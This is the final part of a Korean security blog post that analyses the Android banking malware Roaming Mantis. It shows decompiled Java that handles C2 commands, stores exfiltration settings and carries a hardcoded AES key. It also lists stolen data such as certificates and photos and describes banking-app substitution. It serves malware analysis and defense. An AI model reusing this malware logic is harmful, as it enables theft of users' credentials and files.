<span class="c1">// 2. 앞 글자가 SF인 경우, account(key)-메시지내용(value) 추가</span>
<span class="k">if</span><span class="o">(</span><span class="n">u</span><span class="o">.</span><span class="na">g</span><span class="o">(</span><span class="n">s12</span><span class="o">,</span> <span class="s">"SF"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
<span class="nc">Loader</span><span class="o">.</span><span class="na">access</span><span class="n">$getPreferences$p</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">).</span><span class="na">edit</span><span class="o">().</span><span class="na">putString</span><span class="o">(</span><span class="s">"account"</span><span class="o">,</span> <span class="n">s14</span><span class="o">).</span><span class="na">apply</span><span class="o">();</span>

<span class="c1">// 3. 앞 글자가 IF인 경우, 네트워크(socket등)연결 시도</span>
<span class="k">if</span><span class="o">(</span><span class="n">u</span><span class="o">.</span><span class="na">g</span><span class="o">(</span><span class="n">s12</span><span class="o">,</span> <span class="s">"IF"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>

	<span class="c1">// 3-1. 연결 되었을 경우</span>
	<span class="n">i</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">socket1</span><span class="o">,</span> <span class="s">"peer.ws!!.socket"</span><span class="o">);</span>
	<span class="n">s15</span> <span class="o">=</span> <span class="s">"已连接:"</span> <span class="o">+</span> <span class="n">socket1</span><span class="o">.</span><span class="na">getRemoteSocketAddress</span><span class="o">().</span><span class="na">toString</span><span class="o">();</span>

	<span class="c1">// 3-2. 연결되지 않았을 경우</span>
	<span class="n">s15</span> <span class="o">=</span> <span class="s">"未连接,"</span> <span class="o">+</span> <span class="n">s16</span> <span class="o">+</span> <span class="sc">','</span> <span class="o">+</span> <span class="o">(</span><span class="n">wifiManager0</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="kc">false</span> <span class="o">:</span> <span class="n">wifiManager0</span><span class="o">.</span><span class="na">isWifiEnabled</span><span class="o">())</span> <span class="o">+</span> <span class="sc">','</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">j</span><span class="o">;</span>

<span class="c1">// 4. 앞 긑자리 SI인 경우, addr_url/addr_encoding/addr_pattern/addr_accounts 추가</span>
<span class="k">if</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">z3</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">g</span><span class="o">(</span><span class="n">s12</span><span class="o">,</span> <span class="s">"SI"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">arr_b</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">s13</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
<span class="nc">Loader</span><span class="o">.</span><span class="na">access</span><span class="n">$getPreferences$p</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">).</span><span class="na">edit</span><span class="o">().</span><span class="na">putString</span><span class="o">(</span><span class="s">"addr_url"</span><span class="o">,</span> <span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">list0</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">))).</span><span class="na">putString</span><span class="o">(</span><span class="s">"addr_encoding"</span><span class="o">,</span> <span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">list0</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">1</span><span class="o">))).</span><span class="na">putString</span><span class="o">(</span><span class="s">"addr_pattern"</span><span class="o">,</span> <span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">list0</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">2</span><span class="o">))).</span><span class="na">putString</span><span class="o">(</span><span class="s">"addr_accounts"</span><span class="o">,</span> <span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">list0</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">3</span><span class="o">))).</span><span class="na">apply</span><span class="o">();</span>

<span class="c1">// 5. 앞 글자리 FM인 경우, Key(arr_b1)으로 AES 복호화 후 fsm(key)-메시지내용(value) 추가</span>
<span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">u</span><span class="o">.</span><span class="na">g</span><span class="o">(</span><span class="n">s12</span><span class="o">,</span> <span class="s">"FM"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">arr_b1</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="s">"CpMSc7iSk/dTcRO7aMe4qA=="</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
<span class="nc">Loader</span><span class="o">.</span><span class="na">access</span><span class="n">$getPreferences$p</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">).</span><span class="na">edit</span><span class="o">().</span><span class="na">putString</span><span class="o">(</span><span class="s">"fsm"</span><span class="o">,</span> <span class="n">s18</span><span class="o">)</span>
</code></pre></div></div>

<p>어떤 내용이 오가는지 정확한 내용은 몰라도, 어느 정도 유추는 가능하며 사용자의 기기로 하여금 악의적인 행위를 수행하도록 하는 것을 볼 수 있습니다.</p>

<hr />

<p><strong>⑦ 기타 동작</strong></p>

<ul>
  <li>앱 정보 수집
    <ul>
      <li>설치된 앱들의 정보를 수집합니다.</li>
    </ul>
  </li>
  <li>공인인증서 탈취
    <ul>
      <li><code class="language-plaintext highlighter-rouge">/sdcard/NAKI</code> 에 저장된 공인인증서를 탈취합니다.</li>
    </ul>
  </li>
  <li>배터리 최적화 무시
    <ul>
      <li>백그라운드에서도 안정적으로 실행되기 위해, 배터리 최적화를 무시하도록 합니다.</li>
    </ul>
  </li>
  <li>wifi lock 설정
    <ul>
      <li>연결된 WIFI Lock을 <code class="language-plaintext highlighter-rouge">Swi</code> 라는 이름으로 생성, 백그라운드에서도 연락이 이어지게 끔 동작합니다.</li>
    </ul>
  </li>
  <li>사용자 주변 네트워크, 기기 정보 전송
    <ul>
      <li>사용자의 네트워크와 디바이스 정보를 SharedPreference에 저장합니다.</li>
    </ul>
  </li>
  <li>루팅 탐지
    <ul>
      <li>루팅 여부를 탐지합니다.</li>
    </ul>
  </li>
  <li>금융 앱 관련
    <ul>
      <li>금융 앱 대신 <code class="language-plaintext highlighter-rouge">/sdcard/.upload2</code> 하위의 악성 앱을 실행합니다.</li>
    </ul>
  </li>
  <li>사진 탈취
    <ul>
      <li><code class="language-plaintext highlighter-rouge">/DCIM/Camera</code> 에 위치한 사진 파일들을 탈취합니다.</li>
    </ul>
  </li>
  <li>C2 서버로부터 command 수신
    <ul>
      <li>다양한 command를 전달받아 동작합니다.</li>
    </ul>

    <p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/18.png" alt="18.png" /></p>
  </li>
</ul>

<p>이 외에도 모두 분석하면 꽤 많은 양의 기능을 식별할 수 있을 것으로 예상됩니다.</p>

<hr />

<h1 id="4--outro">4.  Outro</h1>

<p>지금까지 Android Malware : Roaming Mantis를 분석해보았습니다. 타인에게 설명하기에 양도 많고 내용도 복잡해 글을 쓰면서도 고민이 많았습니다. 틀린 부분은 없는지 여러 번 확인도 하였지만, 혹시나 발견하신다면 제 미숙함으로 여겨주시면 감사하겠습니다. (틀린 부분에 대한 문의는 hrjeon@stealien.com으로 연락 바랍니다.)</p>

<p>Roaming Mantis는 매우 정성 들여 만든 Malware입니다. 그만큼 많은 곳에 복제되어서 이곳저곳 쓰일 것입니다. 혹시나 이 Malware를 마주하게 되신다면, 글을 읽으시는 분들도 한번 쯤 분석해보면 어떨까요?</p>

<p>더 많은 로직이 있음에도 다 담을 수 없어 아쉽기도 하고, 남은 로직은 후일에 천천히 풀어보도록 해보겠습니다.</p>

<p>글의 주제를 제공해주신 김도현 팀장님과 분석 실마리를 제공해주신 김동규 선임연구원님, 글 작성을 도와주신 임필호 선임연구원님을 비롯한 모의해킹팀 분들에게 감사합니다.</p>

<p>이 글이 많은 분들의 연구에 도움이 되길 바라며 글을 줄이겠습니다.</p>

    <div class="page-profile-detail">
        <div class="page-profile-detail-info">
            <div>
                <img class="page-profile_image-detail" src="/assets/stealien_inverse.png" />
            </div>
            <div style="position: relative; top: 12px;left: 10px;">
                <div class="page-profile-author">Hyerim Jeon</div>
                <div class="page-profile-email">hrjeon@stealien.com</div>
            </div>
        </div>
    </div>
</div>

<div class="recent-post-area">
    <div class="posts container">
        <div class="h1-recent-post">RECENT POST</div>
            <div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/stealien_inverse.png" class="profile_image" />
            <div class="profile_author">Hyerim Jeon</div>
        </div>
    </div>
    <div class="col">
        <a href="/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko">
            <div class="post-title">
                Android Malware : 사마귀 해부학
            </div>
        </a>
        <div class="post-summary">about Roaming Mantis</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                Hyerim Jeon
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Nov 15, 2023
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div><div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/stealien_inverse.png" class="profile_image" />
            <div class="profile_author">Donggyu Kim</div>
        </div>
    </div>
    <div class="col">
        <a href="/2023-07-31/bughunting-vulnerability-chaining-ko">
            <div class="post-title">
                버그헌팅: 취약점 체이닝의 중요성
            </div>
        </a>
        <div class="post-summary">No impact, No bug</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                Donggyu Kim
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Jul 31, 2023
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div>
        </div>
    </div>
</div>
		</div>
	</section><footer>
  <div class="container" style="display: flex; justify-content: space-between;">
    <!-- <a href="#top">
      <img src="/assets/white_logo.png" class="footer-logo" />
    </a> -->
    <div class="footer-copyright">Copyright &copy; Stealien Inc.</div>
    <div class="footer-icons">
      <a target="_blank" href="https://twitter.com/stealien"><img class="sns" src="/assets/icons/twitter_ic.png"/></a>
      <a target="_blank" href="https://blog.naver.com/stealien_official"><img class="sns" src="/assets/icons/blog_ic.png"/></a>
      <a target="_blank" href="https://www.facebook.com/stealien/"><img class="sns" src="/assets/icons/facebook_ic.png"/></a>
      <a target="_blank" href="https://www.youtube.com/c/STEALIEN"><img class="sns" src="/assets/icons/youtube_ic.png"/></a>
    </div>
  </div>
</footer></body>
</html>
